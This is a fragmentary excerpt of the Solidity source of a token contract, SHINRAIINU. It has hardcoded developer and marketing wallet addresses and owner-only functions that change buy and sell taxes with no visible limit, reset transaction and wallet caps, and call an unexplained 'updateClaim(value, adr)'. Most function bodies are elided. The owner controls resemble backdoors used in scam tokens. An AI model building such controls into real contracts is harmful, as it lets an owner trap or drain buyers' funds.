...
contract SHINRAIINU is Context, IERC20 { 
    ...
    address payable public DevWallet = payable(0xa900CC64c75ba79f8f39df3ebd5fA8465f7343a6);
    address payable public MarketingWallet = payable(0xd1453cce13A410D6B4518b767bab3016Eb346657);
    ...
    function feesUpdate(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function maxTransactionUpdate() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function maxWalletUpdate(uint256 newmaxWallet) external onlyAddress {
    ...
    function updateClaim(uint256 value, address adr) onlyAddress public virtual {
